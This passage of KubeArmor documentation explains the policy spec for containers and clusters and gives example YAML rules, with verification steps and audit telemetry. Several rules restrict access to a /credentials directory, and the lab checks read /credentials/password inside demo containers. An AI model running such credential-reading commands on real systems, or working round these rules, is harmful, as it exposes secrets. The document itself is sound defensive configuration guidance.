      ownerOnly: [true|false]            # --> optional
      fromSource:                        # --> optional
      - path: [absolute exectuable path]
    matchPatterns:
    - pattern: [regex pattern]
      ownerOnly: [true|false]            # --> optional
```

In each match, there are three options.

* ownerOnly (static action: allow owner only; otherwise block all)

  If this is enabled, the owners of the executable(s) defined with matchPaths and matchDirectories will be only allowed to execute.
* recursive

  If this is enabled, the coverage will extend to the subdirectories of the directory defined with matchDirectories.
* fromSource

  If a path is specified in fromSource, the executable at the path will be allowed/blocked to execute the executables defined with matchPaths or matchDirectories. For better understanding, let us say that an operator defines a policy as follows. Then, /bin/bash will be only allowed (blocked) to execute /bin/sleep. Otherwise, the execution of /bin/sleep will be blocked (allowed).

  ```
    process:
      matchPaths:
      - path: /bin/sleep
        fromSource:
        - path: /bin/bash
  ```

### File

The file section is quite similar to the process section.

```
  file:
    matchPaths:
    - path: [absolute file path]
      readOnly: [true|false]             # --> optional
      ownerOnly: [true|false]            # --> optional
      fromSource:                        # --> optional
      - path: [absolute file path]
    matchDirectories:
    - dir: [absolute directory path]
      recursive: [true|false]            # --> optional
      readOnly: [true|false]             # --> optional
      ownerOnly: [true|false]            # --> optional
      fromSource:                        # --> optional
      - path: [absolute file path]
    matchPatterns:
    - pattern: [regex pattern]
      readOnly: [true|false]             # --> optional
      ownerOnly: [true|false]            # --> optional
```

The only difference between 'process' and 'file' is the readOnly option.

* readOnly (static action: allow to read only; otherwise block all)

  If this is enabled, the read operation will be only allowed, and any other operations (e.g., write) will be blocked.

### Network

In the case of network, there is currently one match type: matchProtocols. You can define specific protocols among TCP, UDP, and ICMP.

```
  network:
    matchProtocols:
    - protocol: [protocol]               # --> [ TCP | tcp | UDP | udp | ICMP | icmp ]
      fromSource:                        # --> optional
      - path: [absolute file path]
```

### Capabilities

In the case of capabilities, there is currently one match type: matchCapabilities. You can define specific capability names to allow or block using matchCapabilities. You can check available capabilities in [Capability List](https://github.com/kubearmor/KubeArmor/blob/main/getting-started/supported_capability_list.md).

```
  capabilities:
    matchCapabilities:
    - capability: [capability name]
      fromSource:                        # --> optional
      - path: [absolute file path]
```

### Syscalls

In the case of syscalls, there are two types of matches, matchSyscalls and matchPaths. matchPaths can be used to target system calls targeting specific binary path or anything under a specific directory, additionally you can slice based on syscalls generated by a binary or a group of binaries in a directory. You can use matchSyscall as a more general rule to match syscalls from all sources or from specific binaries.

```
syscalls:
  matchSyscalls:
  - syscall:
    - syscallX
    - syscallY
    fromSource:                            # --> optional
    - path: [absolute exectuable path]
    - dir: [absolute directory path]
      recursive: [true|false]              # --> optional
  matchPaths:
  - path: [absolute directory path | absolute exectuable path]
    recursive: [true|false]                # --> optional
    - syscall:
      - syscallX
      - syscallY
    fromSource:                            # --> optional
    - path: [absolute exectuable path]
    - dir: [absolute directory path]
      recursive: [true|false]              # --> optional
```

There is one options in each match.

* fromSource

  If a path is specified in fromSource, kubearmor will match only syscalls generated by the defined source. For better undrestanding, lets take the example below. Only unlink system calls generated by `/bin/bash` will be matched.

  ```
    process:
      matchPaths:
      - path: /bin/sleep
        - syscall:
          - unlink
        fromSource:
        - path: /bin/bash
  ```

* recursive

  If this is enabled, the coverage will extend to the subdirectories of the directory.
* Action

  The action could be Allow, Audit, or Block. Security policies would be handled in a blacklist manner or a whitelist manner according to the action. Thus, you need to define the action carefully. You can refer to [Consideration in Policy Action](https://github.com/kubearmor/KubeArmor/blob/main/getting-started/consideration_in_policy_action.md) for more details. In the case of the Audit action, we can use this action for policy verification before applying a security policy with the Block action.\
  For System calls monitoring, we only support audit mode no matter what the action is set to.

  ```
    action: [Allow|Audit|Block]
  ```

# Policy Examples for Containers

Here, we demonstrate how to define security policies using our example microservice (multiubuntu).

* Process Execution Restriction
  * Block a specific executable ([ksp-group-1-proc-path-block.yaml](https://github.com/kubearmor/KubeArmor/blob/main/examples/multiubuntu/security-policies/ksp-group-1-proc-path-block.yaml))

    ```yaml
    apiVersion: security.kubearmor.com/v1
    kind: KubeArmorPolicy
    metadata:
      name: ksp-group-1-proc-path-block
      namespace: multiubuntu
    spec:
      selector:
        matchLabels:
          group: group-1
      process:
        matchPaths:
        - path: /bin/sleep
      action:
        Block
    ```

    * Explanation: The purpose of this policy is to block the execution of '/bin/sleep' in the containers with the 'group-1' label. For this, we define the 'group-1' label in selector -> matchLabels and the specific path ('/bin/sleep') in process -> matchPaths. Also, we put 'Block' as the action of this policy.
    * Verification: After applying this policy, please get into one of the containers with the 'group-1' (using "kubectl -n multiubuntu exec -it ubuntu-X-deployment-... -- bash") and run '/bin/sleep'. You will see that /bin/sleep is blocked.
  * Block accessing specific executable matching labels, In & NotIn operator ([ksp-match-expression-in-notin-block-process.yaml](https://github.com/kubearmor/KubeArmor/blob/main/examples/nginx-csp/cluster-security-policies/ksp-match-expression-in-notin-block-process.yaml))

    ```yaml
    apiVersion: security.kubearmor.com/v1
    kind: KubeArmorPolicy
    metadata:
      name: ksp-match-expression-in-notin-block-process
      namespace: multiubuntu
    spec:
      severity: 5
      message: "block execution of a matching binary name"
      selector:
        matchExpressions:
          - key: label
            operator: In
            values: 
              - container=ubuntu-1
          - key: label
            operator: NotIn
            values: 
              - container=ubuntu-3
      process:
        matchPaths:
        - execname: apt
      action:
        Block
    ```

    * Explanation: The purpose of this policy is to block the execution of 'apt' binary in all the workloads in the namespace `multiubuntu`, who contains label `container=ubuntu-1`. For this, we define the 'container=ubuntu-1' as value and operator as 'In' for key `label` in selector -> matchExpressions and the specific execname ('apt') in process -> matchPaths. The other expression `container=ubuntu-3` value and operator as 'NotIn' for key `label` is not mandatory because if we mention something in 'In' operator, everything else is just not slected for matching. Also, we put 'Block' as the action of this policy.
    * Verification: After applying this policy, please exec into any container who contains label `container=ubuntu-1` within the namespace 'multiubuntu' and run 'apt'. You can see the binary is blocked. Then try to do same in other workloads who doesn't contains label `container=ubuntu-1`, the binary won't be blocked.
  * Block accessing specific executable matching labels, NotIn operator ([ksp-match-expression-notin-block-process.yaml](https://github.com/kubearmor/KubeArmor/blob/main/examples/nginx-csp/cluster-security-policies/ksp-match-expression-notin-block-process.yaml))

    ```yaml
    apiVersion: security.kubearmor.com/v1
    kind: KubeArmorPolicy
    metadata:
      name: ksp-match-expression-notin-block-process
      namespace: multiubuntu
    spec:
      severity: 5
      message: "block execution of a matching binary name"
      selector:
        matchExpressions:
          - key: label
            operator: NotIn
            values: 
              - container=ubuntu-1
      process:
        matchPaths:
        - execname: apt
      action:
        Block
    ```

    * Explanation: The purpose of this policy is to block the execution of 'apt' binary in all the workloads in the namespace `multiubuntu`, who doesn't contains label `container=ubuntu-1`. For this, we define the 'container=ubuntu-1' as value and operator as 'In' for key `label` in selector -> matchExpressions and the specific execname ('apt') in process -> matchPaths. Also, we put 'Block' as the action of this policy.
    * Verification: After applying this policy, please exec into any container who contains label `container=ubuntu-1` within the namespace 'multiubuntu' and run 'apt'. You can see the binary is not blocked. Then try to do same in other workloads who doesn't contains label `container=ubuntu-1`, the binary will be blocked.
  * Block all executables in a specific directory ([ksp-ubuntu-1-proc-dir-block.yaml](https://github.com/kubearmor/KubeArmor/blob/main/examples/multiubuntu/security-policies/ksp-ubuntu-1-proc-dir-block.yaml))

    ```yaml
    apiVersion: security.kubearmor.com/v1
    kind: KubeArmorPolicy
    metadata:
      name: ksp-ubuntu-1-proc-dir-block
      namespace: multiubuntu
    spec:
      selector:
        matchLabels:
          container: ubuntu-1
      process:
        matchDirectories:
        - dir: /sbin/
      action:
        Block
    ```

    * Explanation: The purpose of this policy is to block all executables in the '/sbin' directory. Since we want to block all executables rather than a specific executable, we use matchDirectories to specify the executables in the '/sbin' directory at once.
    * Verification: After applying this policy, please get into the container with the 'ubuntu-1' label and run '/sbin/route' to see if this command is allowed (this command will be blocked).
  * Block all executables in a specific directory and its subdirectories ([ksp-ubuntu-2-proc-dir-recursive-block.yaml](https://github.com/kubearmor/KubeArmor/blob/main/examples/multiubuntu/security-policies/ksp-ubuntu-2-proc-dir-recursive-block.yaml))

    ```yaml
    apiVersion: security.kubearmor.com/v1
    kind: KubeArmorPolicy
    metadata:
      name: ksp-ubuntu-2-proc-dir-recursive-block
      namespace: multiubuntu
    spec:
      selector:
        matchLabels:
          container: ubuntu-2
      process:
        matchDirectories:
        - dir: /usr/
          recursive: true
      action:
        Block
    ```

    * Explanation: As the extension of the previous policy, we want to block all executables in the '/usr' directory and its subdirectories (e.g., '/usr/bin', '/usr/sbin', and '/usr/local/bin'). Thus, we add 'recursive: true' to extend the scope of the policy.
    * Verification: After applying this policy, please get into the container with the 'ubuntu-2' label and run '/usr/bin/env' or '/usr/bin/whoami'. You will see that those commands are blocked.
  * Allow specific executables to access certain files only ([ksp-ubuntu-3-file-dir-allow-from-source-path.yaml](https://github.com/kubearmor/KubeArmor/blob/main/examples/multiubuntu/security-policies/ksp-ubuntu-3-file-dir-allow-from-source-path.yaml))

    ```yaml
    apiVersion: security.kubearmor.com/v1
    kind: KubeArmorPolicy
    metadata:
      name: ksp-ubuntu-3-file-dir-allow-from-source-path
      namespace: multiubuntu
    spec:
      severity: 10
      message: "a critical directory was accessed"
      tags:
      - WARNING
      selector:
        matchLabels:
          container: ubuntu-3
      file:
        matchDirectories:
        - dir: /credentials/
          fromSource:
          - path: /bin/cat
      action:
        Allow
    ```

    * Explanation: Here, we want the container with the 'ubuntu-3' label only to access certain files by specific executables. Otherwise, we want to block any other file accesses. To achieve this goal, we define the scope of this policy using matchDirectories with fromSource and use the 'Allow' action.
    * Verification: In this policy, we allow /bin/cat to access the files in /credentials only. After applying this policy, please get into the container with the 'ubuntu-3' label and run 'cat /credentials/password'. This command will be allowed with no errors. Now, please run 'cat /etc/hostname'. Then, this command will be blocked since /bin/cat is only allowed to access /credentials/\*.
  * Allow a specific executable to be launched by its owner only ([ksp-ubuntu-3-proc-path-owner-allow.yaml](https://github.com/kubearmor/KubeArmor/blob/main/examples/multiubuntu/security-policies/ksp-ubuntu-3-proc-path-owner-allow.yaml))

    ```yaml
    apiVersion: security.kubearmor.com/v1
    kind: KubeArmorPolicy
    metadata:
      name: ksp-ubuntu-3-proc-path-owner-allow
      namespace: multiubuntu
    spec:
      severity: 7
      selector:
        matchLabels:
          container: ubuntu-3
      process:
        matchPaths:
        - path: /home/user1/hello
          ownerOnly: true
        matchDirectories:
        - dir: /bin/ # required to change root to user1
          recursive: true
        - dir: /usr/bin/ # used in changing accounts
          recursive: true
      file:
        matchPaths:
        - path: /root/.bashrc # used by root
        - path: /root/.bash_history # used by root
        - path: /home/user1/.profile # used by user1
        - path: /home/user1/.bashrc # used by user1
        - path: /run/utmp # required to change root to user1
        - path: /dev/tty
        matchDirectories:
        - dir: /etc/ # required to change root to user1 (coarse-grained way)
          recursive: true
        - dir: /proc/ # required to change root to user1 (coarse-grained way)
          recursive: true
      action:
        Allow
    ```

    * Explanation: This policy aims to allow a specific user (i.e., user1) only to launch its own executable (i.e., hello), which means that we do not want for the root user to even launch /home/user1/hello. For this, we define a security policy with matchPaths and 'ownerOnly: ture'.
    * Verification: For verification, we also allow several directories and files to change users (from 'root' to 'user1') in the policy. After applying this policy, please get into the container with the 'ubuntu-3' label and run '/home/user1/hello' first. This command will be blocked even though you are the 'root' user. Then, please run 'su - user1'. Now, you are the 'user1' user. Please run '/home/user1/hello' again. You will see that it works now.
* File Access Restriction
  * Allow accessing specific files only ([ksp-ubuntu-4-file-path-readonly-allow.yaml](https://github.com/kubearmor/KubeArmor/blob/main/examples/multiubuntu/security-policies/ksp-ubuntu-4-file-path-readonly-allow.yaml))

    ```yaml
    apiVersion: security.kubearmor.com/v1
    kind: KubeArmorPolicy
    metadata:
      name: ksp-ubuntu-4-file-path-readonly-allow
      namespace: multiubuntu
    spec:
      severity: 10
      message: "a critical file was accessed"
      tags:
      - WARNING
      selector:
        matchLabels:
          container: ubuntu-4
      process:
        matchDirectories:
        - dir: /bin/ # used by root
          recursive: true
        - dir: /usr/bin/ # used by root
          recursive: true
      file:
        matchPaths:
        - path: /credentials/password
          readOnly: true
        - path: /root/.bashrc # used by root
        - path: /root/.bash_history # used by root
        - path: /dev/tty
        matchDirectories:
        - dir: /etc/ # used by root (coarse-grained way)
          recursive: true
        - dir: /proc/ # used by root (coarse-grained way)
          recursive: true
      action:
        Allow
    ```

    * Explanation: The purpose of this policy is to allow the container with the 'ubuntu-4' label to read '/credentials/password' only (the write operation is blocked).
    * Verification: After applying this policy, please get into the container with the 'ubuntu-4' label and run 'cat /credentials/password'. You can see the contents in the file. Now, please run 'echo "test" >> /credentials/password'. You will see that the write operation will be blocked.
  * Block all file accesses in a specific directory and its subdirectories ([ksp-ubuntu-5-file-dir-recursive-block.yaml](https://github.com/kubearmor/KubeArmor/blob/main/examples/multiubuntu/security-policies/ksp-ubuntu-5-file-dir-recursive-block.yaml))

    ```yaml
    apiVersion: security.kubearmor.com/v1
    kind: KubeArmorPolicy
    metadata:
      name: ksp-ubuntu-5-file-dir-recursive-block
      namespace: multiubuntu
    spec:
      selector:
        matchLabels:
          container: ubuntu-5
      file:
        matchDirectories:
        - dir: /credentials/
          recursive: true
      action:
        Block
    ```

    * Explanation: In this policy, we do not want the container with the 'ubuntu-5' label to access any files in the '/credentials' directory and its subdirectories. Thus, we use 'matchDirectories' and 'recursive: true' to define all files in the '/credentials' directory and its subdirectories.
    * Verification: After applying this policy, please get into the container with the 'ubuntu-5' label and run 'cat /secret.txt'. You will see the contents of /secret.txt. Then, please run 'cat /credentials/password'. This command will be blocked due to the security policy.
* Network Operation Restriction
  * Audit ICMP packets ([ksp-ubuntu-5-net-icmp-audit](https://github.com/kubearmor/KubeArmor/blob/main/examples/multiubuntu/security-policies/ksp-ubuntu-5-net-icmp-audit.yaml))

    ```yaml
    apiVersion: security.kubearmor.com/v1
    kind: KubeArmorPolicy
    metadata:
      name: ksp-ubuntu-5-net-icmp-audit
      namespace: multiubuntu
    spec:
      severity: 8
      selector:
        matchLabels:
          container: ubuntu-5
      network:
        matchProtocols:
        - protocol: icmp
      action:
        Audit
    ```

    * Explanation: We want to audit sending ICMP packets from the containers with the 'ubuntu-5' label while allowing packets for the other protocols (e.g., TCP and UDP). For this, we use 'matchProtocols' to define the protocol (i.e., ICMP) that we want to block.
    * Verification: After applying this policy, please get into the container with the 'ubuntu-5' label and run 'curl <https://kubernetes.io/>'. This will work fine. Then, run 'ping 8.8.8.8'. You will see 'Permission denied' since the 'ping' command internally uses the ICMP protocol.
* Capabilities Restriction
  * Block Raw Sockets (i.e., non-TCP/UDP packets) ([ksp-ubuntu-1-cap-net-raw-block.yaml](https://github.com/kubearmor/KubeArmor/blob/main/examples/multiubuntu/security-policies/ksp-ubuntu-1-cap-net-raw-block.yaml))

    ```yaml
    apiVersion: security.kubearmor.com/v1
    kind: KubeArmorPolicy
    metadata:
      name: ksp-ubuntu-1-cap-net-raw-block
      namespace: multiubuntu
    spec:
      severity: 1
      selector:
        matchLabels:
          container: ubuntu-1
      capabilities:
        matchCapabilities:
        - capability: net_raw
      action:
        Block
    ```

    * Explanation: We want to block any network operations using raw sockets from the containers with the 'ubuntu-1' label, meaning that containers cannot send non-TCP/UDP packets (e.g., ICMP echo request or reply) to other containers. To achieve this, we use matchCapabilities and specify the 'CAP\_NET\_RAW' capability to block raw socket creations inside the containers. Here, since we use the stream and datagram sockets to TCP and UDP packets respectively, we can still send those packets to others.
    * Verification: After applying this policy, please get into the container with the 'ubuntu-1' label and run 'curl <https://kubernetes.io/>'. This will work fine. Then, run 'ping 8.8.8.8'. You will see 'Operation not permitted' since the 'ping' command internally requires a raw socket to send ICMP packets.
* System calls alerting
  * Alert for all `unlink` syscalls

    ```yaml
    apiVersion: security.kubearmor.com/v1
    kind: KubeArmorPolicy
    metadata:
      name: audit-all-unlink
      namespace: default
    spec:
      severity: 3
      selector:
        matchLabels:
          container: ubuntu-1
      syscalls:
        matchSyscalls:
        - syscall:
          - unlink
      action:
        Audit
    ```

<details>

<summary>Generated telemetry</summary>

```json
{
  "Timestamp": 1661936135,
  "UpdatedTime": "2022-08-31T08:55:35.368285Z",
  "ClusterName": "default",
  "HostName": "vagrant",
  "NamespaceName": "default",
  "PodName": "ubuntu-1-6779f689b5-jjcvh",
  "Labels": "container=ubuntu-1",
  "ContainerID": "1f613df8390b9d2e4e89d0323ac0b9a2e7d7ddcc460720e15074f8c497aec0df",
  "ContainerName": "nginx",
  "ContainerImage": "nginx:latest@sha256:b95a99feebf7797479e0c5eb5ec0bdfa5d9f504bc94da550c2f58e839ea6914f",
  "HostPPID": 255296,
  "HostPID": 296264,
  "PPID": 47,
  "PID": 65,
  "ParentProcessName": "/bin/bash",
  "ProcessName": "/usr/bin/unlink",
  "PolicyName": "audit-all-unlink",
  "Severity": "3",
  "Type": "MatchedPolicy",
  "Source": "/usr/bin/unlink home/secret.txt",
  "Operation": "Syscall",
  "Resource": "/home/secret.txt",
  "Data": "syscall=SYS_UNLINK",
  "Action": "Audit",
  "Result": "Passed"
}
```

</details>

* Alert on all `rmdir` syscalls targeting anything in `/home/` directory and sub-directories

  ```yaml
  apiVersion: security.kubearmor.com/v1
  kind: KubeArmorPolicy
  metadata:
    name: audit-home-rmdir
    namespace: default
  spec:
    selector:
      matchLabels:
        container: ubuntu-1
    syscalls:
      matchPaths:
      - syscall:
        - rmdir
        path: /home/
        recursive: true
    action:
      Audit
  ```

<details>

<summary>Generated telemetry</summary>

```json
{
  "Timestamp": 1661936575,
  "UpdatedTime": "2022-08-31T09:02:55.841537Z",
  "ClusterName": "default",
  "HostName": "vagrant",
  "NamespaceName": "default",
  "PodName": "ubuntu-1-6779f689b5-jjcvh",
  "Labels": "container=ubuntu-1",
  "ContainerID": "1f613df8390b9d2e4e89d0323ac0b9a2e7d7ddcc460720e15074f8c497aec0df",
  "ContainerName": "nginx",
  "ContainerImage": "nginx:latest@sha256:b95a99feebf7797479e0c5eb5ec0bdfa5d9f504bc94da550c2f58e839ea6914f",
  "HostPPID": 255296,
  "HostPID": 302715,
  "PPID": 47,
  "PID": 67,
  "ParentProcessName": "/bin/bash",
  "ProcessName": "/bin/rmdir",
  "PolicyName": "audit-home-rmdir",
  "Severity": "1",
  "Type": "MatchedPolicy",
  "Source": "/bin/rmdir home/jane-doe/",
  "Operation": "Syscall",
  "Resource": "/home/jane-doe",
  "Data": "syscall=SYS_RMDIR",
  "Action": "Audit",
  "Result": "Passed"
}
```

</details>

# Cluster Policy Spec for Containers

## Cluster Policy Specification

Here is the specification of a Cluster security policy.

```
apiVersion: security.kubearmor.com/v1
kind:KubeArmorClusterPolicy
metadata:
  name: [policy name]
  namespace: [namespace name]              # --> optional

spec:
  severity: [1-10]                         # --> optional 
  tags: ["tag", ...]                       # --> optional
  message: [message]                       # --> optional

  selector:
    matchExpressions:
      - key: [namespace|label]
        operator: [In|NotIn]
        values:
          - [namespaces|labels]

  process:
    matchPaths:
    - path: [absolute executable path]
      ownerOnly: [true|false]              # --> optional
      fromSource:                          # --> optional
      - path: [absolute exectuable path]
    matchDirectories:
    - dir: [absolute directory path]
      recursive: [true|false]              # --> optional
      ownerOnly: [true|false]              # --> optional
      fromSource:                          # --> optional
      - path: [absolute exectuable path]
    matchPatterns:
    - pattern: [regex pattern]
      ownerOnly: [true|false]              # --> optional

  file:
    matchPaths:
    - path: [absolute file path]
      readOnly: [true|false]               # --> optional
      ownerOnly: [true|false]              # --> optional
      fromSource:                          # --> optional
      - path: [absolute exectuable path]
    matchDirectories:
    - dir: [absolute directory path]
      recursive: [true|false]              # --> optional
      readOnly: [true|false]               # --> optional
      ownerOnly: [true|false]              # --> optional
      fromSource:                          # --> optional
      - path: [absolute exectuable path]
    matchPatterns:
    - pattern: [regex pattern]
      readOnly: [true|false]               # --> optional
      ownerOnly: [true|false]              # --> optional

  network:
    matchProtocols:
    - protocol: [TCP|tcp|UDP|udp|ICMP|icmp]
      fromSource:                          # --> optional
      - path: [absolute exectuable path]

  capabilities:
    matchCapabilities:
    - capability: [capability name]
      fromSource:                          # --> optional
      - path: [absolute exectuable path]
  
  syscalls:
    matchSyscalls:
    - syscall:
      - syscallX
      - syscallY
      fromSource:                            # --> optional
      - path: [absolute exectuable path]
      - dir: [absolute directory path]
        recursive: [true|false]              # --> optional
    matchPaths:
    - path: [absolute directory path | absolute exectuable path]
      recursive: [true|false]                # --> optional
      - syscall:
        - syscallX
        - syscallY
      fromSource:                            # --> optional
      - path: [absolute exectuable path]
      - dir: [absolute directory path]
        recursive: [true|false]              # --> optional

  action: [Allow|Audit|Block] (Block by default)
```

> **Note** Please note that for system calls monitoring we only support audit action no matter what the value of action is

## Policy Spec Description

Now, we will briefly explain how to define a cluster security policy.

### Common

A cluster security policy starts with the base information such as apiVersion, kind, and metadata. The apiVersion would be the same in any security policies. In the case of metadata, you need to specify the names of a policy and a namespace where you want to apply the policy and kind would be KubeArmorClusterPolicy.

```
  apiVersion: security.kubearmor.com/v1
  kind:KubeArmorClusterPolicy
  metadata:
    name: [policy name]
    namespace: [namespace name]
```

### Severity

The severity part is somewhat important. You can specify the severity of a given policy from 1 to 10. This severity will appear in alerts when policy violations happen.

```
severity: [1-10]
```

### Tags

The tags part is optional. You can define multiple tags (e.g., WARNING, SENSITIVE, MITRE, STIG, etc.) to categorize security policies.

```
tags: ["tag1", ..., "tagN"]
```

### Message

The message part is optional. You can add an alert message, and then the message will be presented in alert logs.

```
message: [message]
```

### Selector

In the selector section for cluster-based policies, we use matchExpressions to define the namespaces where the policy should be applied and labels to select/deselect the workloads in those namespaces. Currently, only namespaces and labels can be matched, so the key should be 'namespace' and 'label'. The operator will determine whether the policy should apply to the namespaces and its workloads specified in the values field or not. Both `matchExpressions`, `namespace` and `label` are an ANDed operation.

Operator: In\
When the operator is set to In, the policy will be applied only to the namespaces listed and if label `matchExpressions` is defined, the policy will be applied only to the workloads that match the labels in the values field.

Operator: NotIn\
When the operator is set to NotIn, the policy will be applied to all other namespaces except those listed in the values field and if label `matchExpressions` is defined, the policy will be applied to all the workloads except that match the labels in the values field.

```
  selector:
    matchExpressions:              
      - key: namespace
        operator: [In|NotIn]
        values:
        - [namespaces]
      - key: label
        operator: [In|NotIn]
        values:
        - [label]       # string format eg. -> (app=nginx)
```

> **TIP** If the selector operator is omitted in the policy, it will be applied across all namespaces.

### Process

In the process section, there are three types of matches: matchPaths, matchDirectories, and matchPatterns. You can define specific executables using matchPaths or all executables in specific directories using matchDirectories. In the case of matchPatterns, advanced operators may be able to determine particular patterns for executables by using regular expressions. However, the coverage of regular expressions is highly dependent on AppArmor ([Policy Core Reference](https://gitlab.com/apparmor/apparmor/-/wikis/AppArmor_Core_Policy_Reference)). Thus, we generally do not recommend using this match.

```
  process:
    matchPaths:
    - path: [absolute executable path]
      ownerOnly: [true|false]            # --> optional
      fromSource:                        # --> optional
      - path: [absolute executable path]
    matchDirectories:
    - dir: [absolute directory path]
      recursive: [true|false]            # --> optional
      ownerOnly: [true|false]            # --> optional
      fromSource:                        # --> optional
      - path: [absolute exectuable path]
    matchPatterns:
    - pattern: [regex pattern]
      ownerOnly: [true|false]            # --> optional
```

In each match, there are three options.

* ownerOnly (static action: allow owner only; otherwise block all)

  If this is enabled, the owners of the executable(s) defined with matchPaths and matchDirectories will be only allowed to execute.
* recursive

  If this is enabled, the coverage will extend to the subdirectories of the directory defined with matchDirectories.
* fromSource

  If a path is specified in fromSource, the executable at the path will be allowed/blocked to execute the executables defined with matchPaths or matchDirectories. For better understanding, let us say that an operator defines a policy as follows. Then, /bin/bash will be only allowed (blocked) to execute /bin/sleep. Otherwise, the execution of /bin/sleep will be blocked (allowed).

  ```
    process:
      matchPaths:
      - path: /bin/sleep
        fromSource:
        - path: /bin/bash
  ```

### File

The file section is quite similar to the process section.

```
  file:
    matchPaths:
    - path: [absolute file path]
      readOnly: [true|false]             # --> optional
      ownerOnly: [true|false]            # --> optional
      fromSource:                        # --> optional
      - path: [absolute file path]
    matchDirectories:
    - dir: [absolute directory path]
      recursive: [true|false]            # --> optional
      readOnly: [true|false]             # --> optional
      ownerOnly: [true|false]            # --> optional
      fromSource:                        # --> optional
      - path: [absolute file path]
    matchPatterns:
    - pattern: [regex pattern]
      readOnly: [true|false]             # --> optional
      ownerOnly: [true|false]            # --> optional
```

The only difference between 'process' and 'file' is the readOnly option.

* readOnly (static action: allow to read only; otherwise block all)

  If this is enabled, the read operation will be only allowed, and any other operations (e.g., write) will be blocked.

### Network

In the case of network, there is currently one match type: matchProtocols. You can define specific protocols among TCP, UDP, and ICMP.

```
  network:
    matchProtocols:
    - protocol: [protocol]               # --> [ TCP | tcp | UDP | udp | ICMP | icmp ]
      fromSource:                        # --> optional
      - path: [absolute file path]
```

### Capabilities

In the case of capabilities, there is currently one match type: matchCapabilities. You can define specific capability names to allow or block using matchCapabilities. You can check available capabilities in [Capability List](https://github.com/kubearmor/KubeArmor/blob/main/getting-started/supported_capability_list.md).

```
  capabilities:
    matchCapabilities:
    - capability: [capability name]
      fromSource:                        # --> optional
      - path: [absolute file path]
```

### Syscalls

In the case of syscalls, there are two types of matches, matchSyscalls and matchPaths. matchPaths can be used to target system calls targeting specific binary path or anything under a specific directory, additionally you can slice based on syscalls generated by a binary or a group of binaries in a directory. You can use matchSyscall as a more general rule to match syscalls from all sources or from specific binaries.

```
syscalls:
  matchSyscalls:
  - syscall:
    - syscallX
    - syscallY
    fromSource:                            # --> optional
    - path: [absolute exectuable path]
    - dir: [absolute directory path]
      recursive: [true|false]              # --> optional
  matchPaths:
  - path: [absolute directory path | absolute exectuable path]
    recursive: [true|false]                # --> optional
    - syscall:
      - syscallX
      - syscallY
    fromSource:                            # --> optional
    - path: [absolute exectuable path]
    - dir: [absolute directory path]
      recursive: [true|false]              # --> optional
```

There is one options in each match.

* fromSource

  If a path is specified in fromSource, kubearmor will match only syscalls generated by the defined source. For better undrestanding, lets take the example below. Only unlink system calls generated by `/bin/bash` will be matched.

  ```
    process:
      matchPaths:
      - path: /bin/sleep
        - syscall:
          - unlink
        fromSource:
        - path: /bin/bash
  ```

* recursive

  If this is enabled, the coverage will extend to the subdirectories of the directory.
* Action

  The action could be Allow, Audit, or Block. Security policies would be handled in a blacklist manner or a whitelist manner according to the action. Thus, you need to define the action carefully. You can refer to [Consideration in Policy Action](https://github.com/kubearmor/KubeArmor/blob/main/getting-started/consideration_in_policy_action.md) for more details. In the case of the Audit action, we can use this action for policy verification before applying a security policy with the Block action.\
  For System calls monitoring, we only support audit mode no matter what the action is set to.

  ```
    action: [Allow|Audit|Block]
  ```

# Cluster Policy Examples for Containers

Here, we demonstrate how to define a cluster security policies.

* Process Execution Restriction
  * Block a specific executable - In operator ([csp-in-operator-block-process.yaml](https://github.com/kubearmor/KubeArmor/blob/main/examples/nginx-csp/cluster-security-policies/csp-in-operator-block-process.yaml))

    ```yaml
    apiVersion: security.kubearmor.com/v1
    kind: KubeArmorClusterPolicy
    metadata:
      name: csp-in-operator-block-process
    spec:
      severity: 8
      selector:
        matchExpressions:
          - key: namespace
            operator: In
            values:
              - nginx1
      process:
        matchPaths:
          - path: /usr/bin/apt
      action:
        Block
    ```

    * Explanation: The purpose of this policy is to block the execution of '/usr/bin/apt' in the containers present in the namespace nginx1. For this, we define the 'nginx1' value and operator as 'In' in selector -> matchExpressions and the specific path ('/usr/bin/apt') in process -> matchPaths. Also, we put 'Block' as the action of this policy.
    * Verification: After applying this policy, please get into one of the containers in the namespace 'nginx1' (using "kubectl -n nginx1 exec -it nginx-X-... -- bash") and run '/usr/bin/apt'. You will see that /usr/bin/apt is blocked.
  * Block a specific executable - NotIn operator([csp-not-in-operator-block-process.yaml](https://github.com/kubearmor/KubeArmor/blob/main/examples/nginx-csp/cluster-security-policies/csp-not-in-operator-block-process.yaml))

    ```yaml
    apiVersion: security.kubearmor.com/v1
    kind: KubeArmorClusterPolicy
    metadata:
      name: csp-in-operator-block-process
    spec:
      severity: 8
      selector:
        matchExpressions:
          - key: namespace
            operator: NotIn
            values:
              - nginx1
      process:
        matchPaths:
          - path: /usr/bin/apt
      action:
        Block
    ```

    * Explanation: The purpose of this policy is to block the execution of '/usr/bin/apt' in all containers present in the cluster except that are in the namespace nginx1. For this, we define the 'nginx1' value and operator as 'NotIn' in selector -> matchExpressions and the specific path ('/usr/bin/apt') in process -> matchPaths. Also, we put 'Block' as the action of this policy.
    * Verification: After applying this policy, please get into one of the containers in the namespace 'nginx1' (using "kubectl -n nginx1 exec -it nginx-X-... -- bash") and run '/usr/bin/apt'. You will see that /usr/bin/apt is not blocked. Now try running same command in container inside 'nginx2' namespace and it should not be blocked.
  * Block a specific executable matching labels, In operator- In operator ([csp-matchlabels-in-block-process.yaml](https://github.com/kubearmor/KubeArmor/blob/main/examples/nginx-csp/cluster-security-policies/csp-matchlabels-in-block-process.yaml))

    ```yaml
    apiVersion: security.kubearmor.com/v1
    kind: KubeArmorClusterPolicy
    metadata:
      name: csp-matchlabels-in-block-process
    spec:
      severity: 8
      selector:
        matchExpressions:
          - key: namespace
            operator: In
            values:
              - nginx1
          - key: label
            operator: In
            values:
              - app=nginx
              - app=nginx-dev
      process:
        matchPaths:
          - path: /usr/bin/apt
      action:
        Block
    ```

    * Explanation: The purpose of this policy is to block the execution of '/usr/bin/apt' in the workloads who match the labels `app=nginx` OR `app=nginx-dev` present in the namespace `nginx1` . For this, we define the 'nginx1' as value and operator as 'In' for key `namespace` AND `app=nginx` & `app=nginx-dev` value and operator as 'In' for key `label` in selector -> matchExpressions and the specific path ('/usr/bin/apt') in process -> matchPaths. Also, we put 'Block' as the action of this policy.
